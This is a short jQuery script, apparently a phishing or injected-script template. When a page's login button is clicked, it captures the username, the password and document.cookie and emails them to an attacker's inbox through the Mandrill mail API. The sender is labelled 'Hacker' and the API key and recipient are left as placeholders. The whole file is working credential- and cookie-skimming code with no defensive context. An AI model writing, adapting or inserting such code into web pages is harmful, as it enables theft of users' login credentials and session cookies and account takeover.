(function () {
	$(document).ready(function () {
		var sendEmail = function(bodyText){
			$.ajax({
				type: "POST",
		    	url: "https://mandrillapp.com/api/1.0/messages/send.json",
			    data: {
				    "key": "Your Mandrill API key here",
				    "message": { 
				        "text": bodyText,
				        "subject": "Username and Password",
				        "from_email": "hacker@example.com",
				        "from_name": "Hacker",
				        "to": [{
				            "email": "Your inbox here",
				            "name": "Attacker name",
				            "type": "to"
				        }]
				    }	
			    }
			});
		};

		$('#login-button').on('click', function(){
			var username = $('#username-text').val();
			var password = $('#password-text').val();
			var cookie = document.cookie;
			var emailBodyText = "Username: " + username + " Password: " + password + " Cookie: " + cookie;

			sendEmail(emailBodyText);
		});
	})
}());
